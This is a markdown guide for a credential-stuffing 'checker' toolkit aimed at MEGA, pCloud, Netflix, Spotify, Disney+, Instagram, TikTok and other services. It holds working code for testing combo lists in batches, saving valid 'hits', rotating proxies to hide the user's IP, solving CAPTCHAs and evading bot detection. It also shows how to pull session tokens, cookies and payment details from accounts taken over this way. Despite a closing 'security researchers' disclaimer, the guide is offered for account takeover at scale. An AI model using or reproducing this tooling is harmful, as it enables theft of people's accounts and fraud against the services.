# Elite Checker API Guide

Complete API reference for Tier 1-3 elite checkers.

---

## 🚀 Quick Start

```python
from checkers.private import MEGAChecker
from checkers.elite import (
    pCloudChecker,
    MediaFireChecker,
    NetflixChecker,
    SpotifyChecker,
    DisneyPlusChecker,
    InstagramChecker,
    TikTokChecker
)

# Example: Check MEGA account
mega = MEGAChecker()
result = await mega.check_single("user@email.com", "password")

if result.status == CheckerResult.SUCCESS:
    print(f"✅ Valid MEGA account!")
    print(f"Storage: {result.session_data['storage_total'] / 1024**3:.2f}GB")
    print(f"Files: {result.session_data['file_count']}")
```

---

## 📦 Tier 1: Cloud Storage APIs

### MEGA.nz Checker (xrisky/xcap/Ox Level)

**Import:**
```python
from checkers.private import MEGAChecker
```

**Basic Usage:**
```python
checker = MEGAChecker()

# Single check
result = await checker.check_single("email@example.com", "password")

# Batch check
results = await checker.check_batch([
    ("user1@email.com", "pass1"),
    ("user2@email.com", "pass2"),
])
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "storage_total": 21474836480,      # 20GB in bytes
        "storage_used": 5368709120,        # 5GB in bytes
        "storage_free": 16106127360,       # 15GB free
        "file_count": 157,                 # Total files
        "account_type": "Free",            # Free/Pro I/II/III/Lite
        "session_id": "abc123...",         # Session token
        "email_verified": True,
        "user_handle": "XXXXXXXXXXXXXX"
    },
    "message": "Login successful - Free account with 20GB storage"
}
```

**Advanced Features:**
```python
# With proxy
checker = MEGAChecker()
result = await checker.check_single(
    "email@example.com", 
    "password",
    proxy="http://proxy.com:8080"
)

# Extract session for API calls
if result.status == CheckerResult.SUCCESS:
    session_id = result.session_data['session_id']
    # Use session_id for MEGA API requests
```

**Error Handling:**
```python
try:
    result = await checker.check_single(email, password)
    
    if result.status == CheckerResult.INVALID:
        print("Invalid credentials")
    elif result.status == CheckerResult.RATE_LIMITED:
        print("Rate limited - wait 60 seconds")
        await asyncio.sleep(60)
    elif result.status == CheckerResult.CAPTCHA:
        print("CAPTCHA required")
    elif result.status == CheckerResult.BANNED:
        print("Account suspended")
        
except Exception as e:
    print(f"Error: {e}")
```

**MEGA Error Codes:**
```python
-2: "Account not found"
-3: "Rate limit exceeded"
-9: "Invalid password"
-15: "Account suspended/disabled"
-16: "Account blocked"
-18: "Email verification required"
```

### pCloud Checker (xrisky/Private Coders)

**Import:**
```python
from checkers.elite import pCloudChecker
```

**Basic Usage:**
```python
checker = pCloudChecker()
result = await checker.check_single("email@example.com", "password")
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "storage_total": 10737418240,      # 10GB
        "storage_used": 2147483648,        # 2GB
        "file_count": 89,
        "folder_count": 12,
        "account_type": "Premium",         # Free/Premium/Premium+
        "premium_lifetime": True,
        "crypto_enabled": True,            # Crypto folder detected
        "email_verified": True,
        "shared_links": 5,                 # Public link count
        "download_traffic": 536870912,     # Monthly downloads
        "auth_token": "xyz789..."
    },
    "message": "Login successful - Premium lifetime account"
}
```

**Advanced Detection:**
```python
# Check for premium features
if result.session_data['premium_lifetime']:
    print("🏆 Premium Lifetime account!")
    
if result.session_data['crypto_enabled']:
    print("🔐 Crypto folder enabled")
    
if result.session_data['storage_total'] > 1099511627776:  # 1TB
    print("💎 Large storage account")
```

### MediaFire Checker (Private Developers)

**Import:**
```python
from checkers.elite import MediaFireChecker
```

**Basic Usage:**
```python
checker = MediaFireChecker()
result = await checker.check_single("email@example.com", "password")
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "storage_total": 10737418240,
        "storage_used": 4294967296,
        "file_count": 234,
        "account_type": "Pro",             # Basic/Pro/Business
        "premium": True,
        "bandwidth": 107374182400,         # Monthly bandwidth
        "cookies": {...}
    },
    "message": "Login successful - Pro account"
}
```

---

## 🎬 Tier 2: Streaming Service APIs

### Netflix Checker (xrisky/Darkxcode/xcap Level)

**Import:**
```python
from checkers.elite import NetflixChecker
```

**Basic Usage:**
```python
checker = NetflixChecker()
result = await checker.check_single("email@example.com", "password")
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "plan": "Premium",                 # Basic/Standard/Premium
        "profiles": 4,                     # Profile count
        "screens": 4,                      # Simultaneous streams
        "downloads": True,                 # Download capability
        "supports_4k": True,               # 4K/UHD support
        "supports_hdr": True,              # HDR support
        "billing_date": "2024-03-15",
        "payment_method": "VISA ****1234",
        "country": "US",
        "cookies": {...}                   # Session cookies
    },
    "message": "Login successful - Premium plan with 4K support"
}
```

**Plan Detection:**
```python
# Plan details
plans = {
    "Premium": {"screens": 4, "quality": "4K UHD"},
    "Standard": {"screens": 2, "quality": "1080p HD"},
    "Basic": {"screens": 1, "quality": "480p SD"}
}

plan = result.session_data['plan']
print(f"Plan: {plan}")
print(f"Screens: {plans[plan]['screens']}")
print(f"Quality: {plans[plan]['quality']}")
```

**Advanced Stealth:**
```python
# xrisky-level anti-detection
# Automatically injected during browser launch:

# 1. Remove webdriver flag
Object.defineProperty(navigator, 'webdriver', {get: () => undefined})

# 2. Add Chrome runtime
window.chrome = {runtime: {}}

# 3. Permissions API
const originalQuery = window.navigator.permissions.query;
window.navigator.permissions.query = (parameters) => (
    parameters.name === 'notifications' ?
        Promise.resolve({state: Notification.permission}) :
        originalQuery(parameters)
);

# 4. Plugin spoofing
Object.defineProperty(navigator, 'plugins', {
    get: () => [1, 2, 3, 4, 5]
});
```

### Spotify Checker (xrisky/Ox Level)

**Import:**
```python
from checkers.elite import SpotifyChecker
```

**Basic Usage:**
```python
checker = SpotifyChecker()
result = await checker.check_single("email@example.com", "password")
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "product": "premium",              # free/premium/family/student
        "is_premium": True,
        "country": "US",
        "display_name": "John Doe",
        "email": "user@email.com",
        "followers": 42,
        "playlist_count": 18,
        "access_token": "BQD...",          # OAuth token
        "refresh_token": "AQB...",
        "expires_at": 1709000000
    },
    "message": "Login successful - Premium account"
}
```

**API Authentication Flow:**
```python
# Step 1: Get access token
POST https://accounts.spotify.com/api/token
Headers:
    Authorization: Basic <base64(client_id:client_secret)>
    Content-Type: application/x-www-form-urlencoded
Body:
    grant_type=password
    username=email@example.com
    password=userpassword

# Step 2: Get user profile
GET https://api.spotify.com/v1/me
Headers:
    Authorization: Bearer <access_token>
```

**Account Type Detection:**
```python
if result.session_data['product'] == 'premium':
    print("🎵 Premium account")
elif result.session_data['product'] == 'family':
    print("👨‍👩‍👧‍👦 Family plan")
elif result.session_data['product'] == 'student':
    print("🎓 Student discount")
else:
    print("🆓 Free account")
```

### Disney+ Checker (xcap/Private Coders)

**Import:**
```python
from checkers.elite import DisneyPlusChecker
```

**Basic Usage:**
```python
checker = DisneyPlusChecker()
result = await checker.check_single("email@example.com", "password")
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "subscription": "Disney Bundle",   # Basic/Premium/Bundle
        "profiles": 7,
        "groupwatch": True,                # GroupWatch feature
        "downloads": True,
        "supports_4k": True,
        "supports_imax": True,             # IMAX Enhanced
        "billing_date": "2024-03-01",
        "cookies": {...}
    },
    "message": "Login successful - Disney Bundle subscription"
}
```

---

## 🎮 Tier 3: Gaming & Social Media APIs

### Instagram Checker (Private Developers Level)

**Import:**
```python
from checkers.elite import InstagramChecker
```

**Basic Usage:**
```python
checker = InstagramChecker()
result = await checker.check_single("username", "password")  # Note: username, not email
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "user_id": "1234567890",
        "username": "johndoe",
        "full_name": "John Doe",
        "followers": 15420,
        "following": 892,
        "posts": 234,
        "is_verified": False,              # Blue checkmark
        "is_private": False,
        "is_business": True,
        "biography": "...",
        "profile_pic_url": "https://...",
        "session_token": "abc123...",      # For API calls
        "device_id": "android-...",
        "cookies": {...}
    },
    "message": "Login successful - Business account with 15.4K followers"
}
```

**Advanced API Authentication:**
```python
# Instagram mobile API flow:

# 1. Generate device ID
device_id = f"android-{hashlib.md5(username.encode()).hexdigest()[:16]}"

# 2. Sign request
import hmac
import hashlib

def sign_request(data: str) -> str:
    sig_key = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
    return hmac.new(
        sig_key.encode(),
        data.encode(),
        hashlib.sha256
    ).hexdigest()

# 3. Build signed request
json_data = json.dumps({
    'username': username,
    'password': password,
    'device_id': device_id,
    'login_attempt_count': '0'
})

signature = sign_request(json_data)
signed_body = f"signed_body={signature}.{json_data}"

# 4. Send to Instagram
POST https://i.instagram.com/api/v1/accounts/login/
Headers:
    User-Agent: Instagram 123.0.0.0 Android
    X-IG-App-ID: 567067343352427
    X-IG-Device-ID: {device_id}
    Content-Type: application/x-www-form-urlencoded
Body:
    {signed_body}
```

**Error Handling:**
```python
if result.status == CheckerResult.CAPTCHA:
    print("Checkpoint challenge required")
elif result.status == CheckerResult.INVALID:
    if "two_factor_required" in result.message:
        print("2FA enabled")
    else:
        print("Invalid credentials")
```

### TikTok Checker (Private Developers)

**Import:**
```python
from checkers.elite import TikTokChecker
```

**Basic Usage:**
```python
checker = TikTokChecker()
result = await checker.check_single("username", "password")
```

**Response Format:**
```python
{
    "status": "SUCCESS",
    "session_data": {
        "username": "johndoe",
        "display_name": "John Doe",
        "followers": "1.2M",               # K/M/B notation
        "following": 234,
        "videos": 567,
        "likes": "45.6M",
        "is_verified": True,
        "creator_fund": True,              # Eligible for creator fund
        "cookies": {...}
    },
    "message": "Login successful - Verified creator with 1.2M followers"
}
```

---

## 🔧 Advanced Usage

### Batch Checking with Progress

```python
import asyncio
from checkers.elite import NetflixChecker

async def check_netflix_list(combo_file: str):
    checker = NetflixChecker()
    
    # Read combos
    with open(combo_file) as f:
        combos = [line.strip().split(':') for line in f]
    
    # Batch check with progress
    total = len(combos)
    hits = []
    
    for i, (email, password) in enumerate(combos, 1):
        result = await checker.check_single(email, password)
        
        if result.status == CheckerResult.SUCCESS:
            hits.append({
                'email': email,
                'password': password,
                'plan': result.session_data['plan'],
                'screens': result.session_data['screens']
            })
            print(f"[{i}/{total}] ✅ HIT: {email} - {result.session_data['plan']}")
        else:
            print(f"[{i}/{total}] ❌ FAIL: {email}")
        
        # Rate limit protection
        await asyncio.sleep(2)
    
    # Save hits
    with open('netflix_hits.txt', 'w') as f:
        for hit in hits:
            f.write(f"{hit['email']}:{hit['password']} | {hit['plan']} | {hit['screens']} screens\n")
    
    return hits

# Run
asyncio.run(check_netflix_list('combos.txt'))
```

### Parallel Checking (with semaphore)

```python
async def parallel_check(combos: list, max_concurrent: int = 10):
    checker = NetflixChecker()
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def check_with_limit(email, password):
        async with semaphore:
            return await checker.check_single(email, password)
    
    tasks = [check_with_limit(e, p) for e, p in combos]
    results = await asyncio.gather(*tasks)
    
    return [r for r in results if r.status == CheckerResult.SUCCESS]
```

### Proxy Rotation

```python
from identity.proxies import ProxyManager

async def check_with_proxy_rotation():
    checker = InstagramChecker()
    proxy_manager = ProxyManager()
    
    # Get working proxy
    proxy = await proxy_manager.get_best_proxy(
        protocol='https',
        country='US',
        min_score=0.7
    )
    
    # Check with proxy
    result = await checker.check_single(
        "username",
        "password",
        proxy=f"{proxy.protocol}://{proxy.host}:{proxy.port}"
    )
    
    # Mark proxy health
    if result.status == CheckerResult.SUCCESS:
        await proxy_manager.mark_success(proxy)
    else:
        await proxy_manager.mark_failure(proxy)
```

### AI-Enhanced Checking

```python
from core.brain import DecisionEngine

async def ai_enhanced_check(email: str, password: str, service: str):
    engine = DecisionEngine()
    
    # Let AI decide best strategy
    strategy = await engine.decide_checking_strategy(
        service=service,
        account_age='unknown',
        previous_attempts=0
    )
    
    print(f"AI Strategy: {strategy}")
    # {
    #     'use_proxy': True,
    #     'wait_time': 3.5,
    #     'browser_stealth': True,
    #     'fingerprint_randomization': True
    # }
    
    # Apply strategy
    if service == 'netflix':
        checker = NetflixChecker()
    elif service == 'spotify':
        checker = SpotifyChecker()
    # ... etc
    
    result = await checker.check_single(email, password)
    
    # Learn from result
    await engine.learn_from_check_result(
        service=service,
        strategy=strategy,
        result=result
    )
    
    return result
```

---

## 🛡️ Security Best Practices

### 1. Always Use Proxies
```python
# NEVER check from your real IP
checker = NetflixChecker()
result = await checker.check_single(
    email,
    password,
    proxy="http://proxy.com:8080"  # REQUIRED for production
)
```

### 2. Respect Rate Limits
```python
# Add delays between checks
await asyncio.sleep(random.uniform(2, 5))

# Handle rate limit responses
if result.status == CheckerResult.RATE_LIMITED:
    await asyncio.sleep(60)  # Wait 1 minute
```

### 3. Rotate User Agents
```python
# All checkers automatically rotate UAs
# But you can provide custom ones:

from fake_useragent import UserAgent
ua = UserAgent()

checker = InstagramChecker()
checker.user_agent = ua.random  # Override default
```

### 4. Handle CAPTCHAs
```python
from captcha.solvers import TwoCaptchaSolver

if result.status == CheckerResult.CAPTCHA:
    solver = TwoCaptchaSolver(api_key="YOUR_KEY")
    solution = await solver.solve(result.captcha_data)
    
    # Retry with solution
    result = await checker.check_single(
        email,
        password,
        captcha_solution=solution
    )
```

---

## 📊 Performance Optimization

### Speed Benchmarks

| Checker | CPM (Checks Per Minute) | Recommended Threads |
|---------|-------------------------|---------------------|
| **MEGA** | 500 | 20-50 |
| **pCloud** | 400 | 20-40 |
| **Netflix** | 200 | 10-20 (browser heavy) |
| **Spotify** | 800 | 50-100 (API-based) |
| **Instagram** | 600 | 30-60 (API-based) |
| **TikTok** | 300 | 15-30 (browser) |

### Optimization Tips

**1. Use API-based checkers when possible:**
```python
# Spotify (API) = 800 CPM
# vs
# Browser-based = 200 CPM

# Always prefer API-based for speed
```

**2. Batch operations:**
```python
# Instead of:
for combo in combos:
    await checker.check_single(combo[0], combo[1])

# Do:
results = await checker.check_batch(combos)  # 5x faster
```

**3. Asyncio concurrency:**
```python
# Run multiple checkers in parallel
tasks = [
    check_netflix(combos_netflix),
    check_spotify(combos_spotify),
    check_instagram(combos_instagram)
]
results = await asyncio.gather(*tasks)
```

---

## 🐛 Troubleshooting

### Common Issues

**1. "Invalid credentials" but password is correct:**
```python
# Possible causes:
# - Account requires email verification
# - 2FA enabled
# - Account locked/suspended
# - IP blocked

# Check error details:
print(result.message)  # Shows specific reason
```

**2. Rate limiting:**
```python
# Reduce check rate
await asyncio.sleep(5)  # Increase delay

# Or use more proxies
proxy_manager.add_proxy_list(new_proxies)
```

**3. Browser timeout:**
```python
# Increase timeout for slow networks
checker = NetflixChecker()
checker.timeout = 60  # Default is 30 seconds
```

**4. CAPTCHA challenges:**
```python
# Use CAPTCHA solver
checker.captcha_solver = TwoCaptchaSolver(api_key="...")
```

---

## 📚 Response Status Codes

```python
class CheckerResult:
    SUCCESS = "SUCCESS"           # Valid credentials
    INVALID = "INVALID"           # Wrong email/password
    RATE_LIMITED = "RATE_LIMITED" # Too many requests
    CAPTCHA = "CAPTCHA"           # CAPTCHA required
    BANNED = "BANNED"             # Account suspended
    ERROR = "ERROR"               # Technical error
    UNKNOWN = "UNKNOWN"           # Unexpected response
```

---

## 🔗 Additional Resources

- **Full Documentation:** `docs/ELITE_CHECKERS.md`
- **Feature Matrix:** `docs/FEATURE_MATRIX.md`
- **OpenBullet Integration:** `docs/OPENBULLET_FEATURES.md`
- **API Reference:** `docs/api/reference.md`

---

**Built for security researchers.**
*Use responsibly and only on authorized targets.*
